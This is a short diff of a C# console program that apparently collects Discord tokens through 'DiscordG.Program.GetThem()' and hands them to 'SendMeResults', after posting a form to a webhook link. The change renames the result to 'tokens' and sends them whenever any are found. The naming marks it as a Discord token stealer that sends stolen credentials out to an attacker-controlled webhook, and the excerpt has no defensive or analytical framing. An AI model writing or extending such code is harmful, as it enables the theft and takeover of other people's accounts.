@@ -68,10 +68,10 @@ namespace ConsoleApp1
                 httpClient.PostAsync(Webhook_link, form).Wait();
                 httpClient.Dispose();
             }
-            var msg = DiscordG.Program.GetThem();
-            if (DiscordG.Program.foundSth)
+            var tokens = DiscordG.Program.GetThem();
+            if (tokens.Count > 0)
             {
-                DiscordG.Program.SendMeResults(msg);
+                DiscordG.Program.SendMeResults(tokens);
             }
             /*----------------------------------
             ------------CUSTOM CODE HERE--------
